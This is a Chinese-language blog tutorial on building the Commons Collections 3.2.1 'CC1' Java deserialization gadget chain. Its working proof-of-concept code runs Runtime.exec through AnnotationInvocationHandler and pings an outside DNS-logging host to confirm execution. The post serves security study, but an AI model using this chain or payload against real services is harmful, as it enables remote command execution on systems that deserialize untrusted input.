---
layout: mypost
title: "低版本RCE链-CommonCollections1链"
categories: [Java安全]
---

## 前言

应该是 CommonCollections（CC 链）系列的开篇链吧，简单记录一下 CommonCollections-->

Apache Commons Collections 是 Apache Commons 项目的一部分，专注于提供增强的集合类和实用工具。Commons Collections 包含了一组丰富的集合实现和工具类，例如：

- 新的集合类型（如 Bag、MultiMap、BidiMap）
- 高效的集合操作工具
- 强大的集合装饰器

更加详细的用法官网查看即可-->[Apache Commons Collections](https://commons.apache.org/proper/commons-collections/)

在组长视频里看到个不错的流程图，算是对反序列化漏洞的原理做了一个宏观上的梳理，既然这是 CC 链的开篇，那就重新画一遍粘在这里吧。

![](image-43.png)

图是从前向后画的，构造的话应该是从后往前一步步找的，这里的 Gadget 只是写了三个，可能比三个多也可能比三个少，这里最想记录的一点是：通过流程图可以直观的看到 Entrance class 和 Gadget 中的类其实没什么两样的，唯一多出来的就是重写了这个 readObject 方法，且在方法中调用了同名函数，但这也是最核心的、最重要的、最难找的。

还想强调的是，虽然 Gadget 以及 Entrance class 中写的均是参数直接去调用了同名函数，但真实情况也不一定是这样，拿 C 类和 D 类举个栗子-->

```
sink是DClass.exec()

图中是直接去调用，把object传成DClass即可
1. CClass.C(Object object)
2. object.exec()

当然也可以间接调用
1. CClass.Constructor(Object object)
2. var = object
3. var.exec()

反正不管咋变，肯定得有一个参数能让我们控制（且最好是个Object类型），区别无非是直接还是间接罢了
```

## 准备工作

1.下载 Java 8u71 之前的 JDK 版本，8u66、8u65 都可以，因为在 8u71 以后的版本，Java
官方修改了`sun.reflect.annotation.AnnotationInvocationHandler`的 readObject 函数。

tips：下载时候 Oracle 的下载页面存在重定向逻辑，选择了 JDK 8u65，但实际上它会自动将你重定向到更新的补丁版本（比如 8u111、8u112 等等），因为 Oracle 会推荐更安全的版本，所以不能直接下载，即采用直接 F12 拿原始的下载链接即可。

2.maven 添加依赖如下-->

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

3.下载并配置源码，JDK 自带的包里面有些 Java 源码是反编译的.class 文件后的源码，很难阅读 📖 和调试（很难调试指的是 idea 全局搜索的时候无法去搜这种反编译 class 的代码），所以需要去安装相应的源码。下载地址在这里-->[JDK 8u65 源码](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)，在项目结构那里添加一下即可，而 maven 中有的代码也是反编译的 class 文件，点击右上角下载源代码即可。

至此准备工作完毕！接下来循序渐进的论这条链子！

## 寻找 sink

CommonCollections 这个依赖是为了去更加方便的操纵集合类，那它的代码中肯定就会去实现一些功能让开发人员可以直接拿来使用，为了体现这个依赖的便捷性，举个再简单不过的例子-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) {
        Map<String, Integer> innerMap = new HashMap<>();
        innerMap.put("a", 1);
        innerMap.put("b", 2);

        Transformer keyTransformer = new KeyTransformer();
        Transformer valueTransformer = new ValueTransformer();

        Map<String, Integer> outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);

        outerMap.put("c", 3);

        System.out.println(innerMap);
        System.out.println(outerMap);
    }

    private static class KeyTransformer implements Transformer {
        @Override
        public Object transform(Object input) {
            return ((String) input).toUpperCase();
        }
    }

    private static class ValueTransformer implements Transformer {
        @Override
        public Object transform(Object input) {
            return ((Integer) input) + 10;
        }
    }
}
```

上述代码的功能是将 innerMap 中的 key 全部转换为大写，value 全部加 10，然后将转换后的结果放入 outerMap 中。不难发现这类似于一个加工厂，将原料加工成成品，而这个加工厂就是 TransformedMap，而原料就是 innerMap，而成品就是 outerMap。但 put 都是向一个 Map 中去添加数据，只不过`outerMap.put("c", 3);`会走工厂被加工一下，所以运行后的结果如下，inner 和 outer 都是一个 Map-->

```
{a=1, b=2, C=13}
{a=1, b=2, C=13}
```

不难看出 xxxTransformer 就代表了实现某一项功能的类，功能真正的实现代码在 transform()这个函数中，比如 keyTransformer 就代表了将 key 全部转换为大写，valueTransformer 就代表了将 value 全部加 10（这里没有去新建类去实现接口，就是）。可以看到 transform()是重写了 Transformer 接口中的 transform()方法。

![](image-44.png)

![](image-45.png)

而且当执行完`Map<String, Integer> outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);`之后在 put 新的键值对是自动去调用了 xxxTransformer()中的 transform()方法，大白话一点就是弓已经拉好了，把箭搭上去即可发射。

言归正传，通过上面三段思考，去找这些个功能类中有无能造成危害的、可能被利用的地方就是去找实现 Transformer 接口的类中的 transform()方法，不班门弄斧的去找了，最后就是在 InvokerTransformer 类中找到了。

![](image-46.png)

它的 transform()方法如下-->

![](image-47.png)

不陌生，一个标准的反射写法，但这里可以调用执行任意类的任意方法，也就是 RCE，类是 public 的，构造函数是 public 的，写个触发 sink 的代码如下-->

```java
import org.apache.commons.collections.functors.InvokerTransformer;

public class Example {
    public static void main(String[] args) {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, argsForConstructor);
        invokerTransformer.transform(Runtime.getRuntime());
    }
}
```

本意是好的，相当于给 invoke 做了一层封装，开发人员只用关注传参即可。有利有弊吧，直接打一个 DNS，结果如下-->

![](image-48.png)

## 插曲-洞悉概念

继续向下挖掘，是要去找不同类的同名函数，即 transform 方法，但这之前先洞悉几个概念（这里借鉴 P 神），去明白开发人员写下代码的意图，而不是单单去冰冷的挖掘。

1.TransformedMap 函数，这个概念通过上述给出的例子已经很明显了，TransformedMap ⽤于对 Java 标准数据结构 Map 做⼀个修饰，被修饰过的 Map 在添加新的元素时，将可以执⾏⼀个回调。弓已经拉好了，把箭搭上去即可发射。

```java
Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);
```

2.Transformer 接口，其中有一个待实现的 transform()方法，这个 transform()方法就是去实现具体的功能，上面例子也很清楚了，一个转大写的功能，一个加 10 的功能。

```java
public interface Transformer {
    Object transform(Object input);
}
```

3.InvokerTransformer 类，这个类实现了 Transformer 接口，并且重写了 transform()方法，这个 transform()方法就是 CC1 用到的 sink，不再赘述。

4.ChainedTransformer 也是实现了 Transformer 接⼝的⼀个类，顾名思义链式、连接相关的，它可以将多个 Transformer 连接起来。举个例子说明-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) {
        Map<String, Integer> innerMap = new HashMap<>();
        innerMap.put("abc", 1);
        innerMap.put("def", 2);

        Transformer keyTransformer = new ChainedTransformer(new Transformer[]{
                new ToUpperCaseTransformer(),
                new ReverseStringTransformer()
        });

        Transformer valueTransformer = new AddTenTransformer();
        Map<String, Integer> outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);
        outerMap.put("ghi", 3);
        System.out.println(innerMap);
        System.out.println(outerMap);
    }

    private static class ToUpperCaseTransformer implements Transformer {
        @Override
        public Object transform(Object input) {
            return ((String) input).toUpperCase();
        }
    }

    private static class ReverseStringTransformer implements Transformer {
        @Override
        public Object transform(Object input) {
            return new StringBuilder((String) input).reverse().toString();
        }
    }

    private static class AddTenTransformer implements Transformer {
        @Override
        public Object transform(Object input) {
            return ((Integer) input) + 10;
        }
    }
}
```

上述代码的功能是将 innerMap 中的 key 全部转换为大写，然后再反转，value 全部加 10，然后将转换后的结果放入 outerMap 中。其实就是多了一步，将 key 给反转，如果没有 ChainedTransformer 这个类的话，可能就得写两次重复的代码，这个类相当于把 ToUpperCaseTransformer 类与 ReverseStringTransformer 类的功能相联合起来，将第一个工厂加工后的产物当作原料送到第二个工厂继续加工，最终得出产品。

5.还有一个是 ConstantTransformer，也是 P 神提到了一下，这个类是将所有元素都转换为一个固定的值，很简单，举个例子说明一下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;

public class Example {
    public static void main(String[] args) {
        Transformer constantTransformer = new ConstantTransformer("Hello World");
        System.out.println(constantTransformer.transform("abc"));
        System.out.println(constantTransformer.transform(123));
        System.out.println(constantTransformer.transform(null));
    }
}
```

输出结果如下-->

```
Hello World
Hello World
Hello World
```

无论输入是什么，它都会忽略输入并返回一个在构造时指定的常量值。

## 初顾茅庐

复杂的概念弄清楚，接下来去找不同类的同名函数，一共 23 处

![](image-49.png)

1.初顾茅庐，找到了下面这处地方

![](image-50.png)

其中的 valueTransformer 不是一个常量，是从 TransformedMap 类的构造函数里来的

![](image-51.png)

而构造函数是 protected 类型的，是在下面这里调用了构造函数

![](image-52.png)

OK，现在这个 valueTransformer 是可控的了，参数类型虽然不是 Object，是 Transformer 类型的，足够用了，只需要将 TransformedMap.decorate(map,key,value)中的 value 给换成 invokerTransformer 即可，代码如下-->

```java
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, argsForConstructor);
        //invokerTransformer.transform(Runtime.getRuntime());
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);
    }
}
```

不想费工夫再去反射调用一个 transformValue 方法，然后再传一个`Runtime.getRuntime()`的参数，此时运行肯定没有 RCE。

2.接下来，看`valueTransformer.transform(object);`中的 object，它是从 transformValue 这个函数的参数来的，要控制参数那就要找同名函数（可以是同类也可以是不同类），而接下来找链子，最好是要去找不同类但是与 transformValue 同名的函数，不管是为了找参数的输入点还是为了继续找链子，都是得先去找同名函数，也巧，除了它自身以外就只有两个同名函数，且都是是在同一类中，看看这个 put。

![](image-53.png)

![](image-54.png)

这个 put 是重写了 Map 类的 put 方法，只要调用 TransformedMap 类的实例的 put 方法，就会自动调用 transformValue 这个函数，而 transformValue 这个函数的参数就是 object，所以 object 就是可控的了。

3.那现在只需要对 transformedMap 进行一个 put 的操作即可，不仅去调用了 transformValue 函数，参数也能传一个 Runtime.getRuntime()进行 RCE，代码如下-->

```java
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, argsForConstructor);
        //invokerTransformer.transform(Runtime.getRuntime());
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);
        transformedMap.put("null",Runtime.getRuntime());
    }
}
```

结果如下-->

![](image-48.png)

接下来就是去找哪里又调用了 put，这个可就多了，大概有 10490 处调用了......这里是初顾茅庐，找到了一个这样的，至于后面有没有成功的链子，目前未知，谁都不敢保证这么走后面就没有一条成功的链子。

当然 CC1 最后走的不是这里，CC1 从一开始找 transform 的同名函数时候，并不是找的 transformValue 这个方法，而是下面这里

![](image-55.png)

4.初顾茅庐链子就到这里，将初顾茅庐的链子，结合洞悉概念时候提及的几个方法相结合，美化一下代码，如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(methodName, paramTypes, argsForConstructor)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        transformedMap.put(null,null);
    }
}
```

结果如下-->

![](image-48.png)

## 再探茅庐

上面提到 CC1 从一开始找 transform 的同名函数时候，并不是找的 transformValue 这个方法，而是下面这里-->

```java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

这个 valueTransformer 的赋值并没有变，还是这一段代码`Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);`接下来就去找谁调用了 checkSetValue 这个函数，很巧，只有一处调用了

![](image-56.png)

这里迷住了，这个 parent 是从何而来？能不能被控制？这里就一步步向上跟代码，AbstractInputCheckedMapDecorator 类中从下往上是这样的-->

第 188 行：

![](image-58.png)

第 174 行：

![](image-59.png)

第 169 行：

![](image-60.png)

第 122 行：

![](image-61.png)

第 118 行：

![](image-62.png)

第 101 行：

![](image-63.png)

发现最后是一个 entrySet 方法的 this，也就是哪个实例去调用了 entrySet 方法，那么这个 this 就是这个实例。而这个 entrySet 是似曾相识的，在 for 循环处理 Map 见到过，举个例子-->

```java
import java.util.*;

public class Example {
    public static void main(String[] args) {
        Map<String, Integer> map = new HashMap<>();
        map.put("Apple", 1);
        map.put("Banana", 2);
        map.put("Cherry", 3);

        for (Map.Entry<String, Integer> entry : map.entrySet()) {
            String key = entry.getKey();
            Integer value = entry.getValue();
            System.out.println(key + ": " + value);
        }
    }
}
```

看到这里不难发现这个 AbstractInputCheckedMapDecorator 类是一个抽象类，它的其中一个子类是 TransformedMap，而它的父类是 AbstractMapDecorator，而 AbstractMapDecorator 的父类是 Map 类，AbstractInputCheckedMapDecorator 类里面的很多方法都是重写了 Map 中的类，entrySet 它就是去重写过，那现在 AbstractInputCheckedMapDecorator 类有点那种给 Map 包装的意思了，它也能去实现一个属于自己的 entrySet！

既然这样那就将 xxx.entrySet()中的 xxx 改成 transformedMap 即可，代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(methodName, paramTypes, argsForConstructor)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put(null,null);
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        transformedMap.entrySet();
    }
}
```

在最后一行下断点一步步调试，发现运行到下图位置就结束了-->

![](image-64.png)

也就是去实例化了一个内部类，想要继续执行还要继续走 iterator 方法、next 方法，这就是 for 循环干的了，再改一下上面的代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(methodName, paramTypes, argsForConstructor)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put(null,null);
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        for(Map.Entry entry: transformedMap.entrySet()){

        }
    }
}
```

此时下断点再调试，发现此时的 parent 已经被赋值了，且值为 transformedMap，如下图-->

![](image-65.png)

最后直接去调用 setValue 方法，由于 transformedMap 没有重写则直接调用父类的，即可触发`parent.checkSetValue(value)`也就是`transformedMap.checkSetValue(value)`即可触发`valueTransformer.transform(value)`也就是`chainedTransformer.transform(value)`而 value 虽然等于 null，但是还有`ConstantTransformer(Runtime.getRuntime())`，最后执行`InvokerTransformer(methodName, paramTypes, argsForConstructor)`，再探茅庐的完整代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(methodName, paramTypes, argsForConstructor)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put(null,null);
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        for(Map.Entry entry: transformedMap.entrySet()){
            entry.setValue(null);
        }
    }
}
```

执行后的结果如下-->

![](image-48.png)

## 三顾茅庐

走到这里了，去找有无在 readObject 方法中调用了 setValue 方法的类，不班门弄斧了，就是 AnnotationInvocationHandler 这个类-->

![](image-66.png)

且可以看到它的这行代码`for (Map.Entry<String, Object> memberValue : memberValues.entrySet())`已经实现了一个 for 循环，意味着只用让 memberValues 等于 transformedMap 即可，而 memberValues 可从该类的构造函数来，很美的一条链子。这个类不是 public 的，反射构造一下即可，代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(methodName, paramTypes, argsForConstructor)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put(null,null);
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor m = clazz.getDeclaredConstructor(Class.class, Map.class);
        m.setAccessible(true);
        m.newInstance(Override.class, transformedMap);
    }
}
```

加上序列化、反序列化的代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        String methodName = "exec";
        Class<?>[] paramTypes = new Class[]{String.class};
        Object[] argsForConstructor = new Object[]{"ping 6y7d5.cxsys.spacestabs.top"};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer(methodName, paramTypes, argsForConstructor)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put(null,null);
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor m = clazz.getDeclaredConstructor(Class.class, Map.class);
        m.setAccessible(true);
        m.newInstance(Override.class, transformedMap);
        serializeObject(m);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

到这里已经大差不差了，有两个小问题需要去解决一下

```
1. 上述代码运行报错，报错原因是Runtime类不能序列化
2. Entrance class中readObject方法中虽然有memberValue.setValue，但代码走到这一行需要两个if判断均为True
```

解决方案如下-->

1.针对第一个问题，是因为 Runtime 类没有继承 Serializable 接口，所以不能序列化

![](image-67.png)

它没有去继承 Serializable 接口，但是在生成 Payload 的时候`new ConstantTransformer(Runtime.getRuntime())`这行代码就已经实例化了一个 Runtime 的对象，这种其实也是书写反序列化漏洞的习惯，大家习惯都先 new 出实例，然后去序列化，反序列化得到的就是实例，然后链子构造好，一条龙的执行即可。但是现在既然 Runtime 类不能序列化，而又想在反序列化的时候得到一个实例，那么就会想到反射，只需要在序列化的时候去序列化一个 Runtime 的 Class 对象即可，有 Class 对象就有办法去反射出 Runtime 的实例，而 Class 类是继承了 Serializable 接口的，所以可以序列化。

![](image-68.png)

反射代码如下-->

```java
Class<?> clazz = Class.forName("java.lang.Runtime");
clazz.getMethod("exec",String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz),"ping 6y7d5.cxsys.spacestabs.top");
```

把这个改成 InvokerTransformer 类的写法，代码如下，检验是否可行-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        map.put(null, null);
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        for (Map.Entry entry : transformedMap.entrySet()) {
            entry.setValue(null);
        }
    }
}
```

可以成功触发 DNS 请求，如下图-->

![](image-48.png)

Tips：小插曲，可能会觉得 transformers 里面放三个 InvokerTransformer 有点奇怪，为什么不直接去获取 getRuntime 方法？根本原因还是在 InvokerTransformer 的 transform 方法中`Class cls = input.getClass();`这里。

![](image-69.png)

若改成直接去获取 getRuntime 方法的写法，也就是下面这样-->

```java
Class<?> clazz = Class.forName("java.lang.Runtime");
Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getRuntime",
                        new Class[]{null},
                        new Object[]{null}
                )
                ,
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
```

下断点调试会发现此时的 cls 是等于`java.lang.Class`的，在对 Class 类去找 getRuntime 方法绝对是找不到的，所以要分开两步走，先通过 getMethod 去找到 getRuntime，再调用 invoke 方法去调用 getRuntime 方法，拿到实例。

![](image-70.png)

目前，加上序列化和反序列化的代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Example {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put(null,null);
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Override.class, transformedMap);
        serializeObject(instance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

现在运行不会报不能序列化的错误，但是依旧不能命令执行，接下来解决第二个问题

2.if 判断的问题，在 readObject 方法那里下断点查看-->

![](image-71.png)

第一个 if 判断就没进去，要想使`memberType != null`那么就得使 memberTypes 中存在一个叫 name 的值，而 name 的值是可以控制的，就是上述 Payload 中`map.put(null,null);`它的 key 值，而 memberTypes 的来龙去脉如下

![](image-72.png)

就是上述 Payload 中`Object instance = constructor.newInstance(xxx.class, transformedMap);`的 xxx.class，这个 xxx.class 还必须是个注解类型，就是要找一个有抽象方法的注解类型的类，找到一个类如下-->

![](image-73.png)

所以把 xxx.class 改成 Retention.class，`map.put(null,null);`中的 key 改成 value 即可，而第二个 if 的意思是，如果 value 既不是 memberType 类型的实例，也不是 ExceptionProxy 类型的实例，这里显然不是的，那第二个 if 也可以进去。还有`map.put(null,null);`中的 key 不仅要等于 value，且 value 也不能为 null，否则会报错，报错如下-->

![](image-74.png)

应修改为`map.put("value","xxx");`至此 CC1 的完整 Poc 书写完毕，代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        serializeObject(instance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

DNS 平台成功收到请求，如下图-->

![](image-48.png)

三顾茅庐，CC1 从 0 到 1 完毕！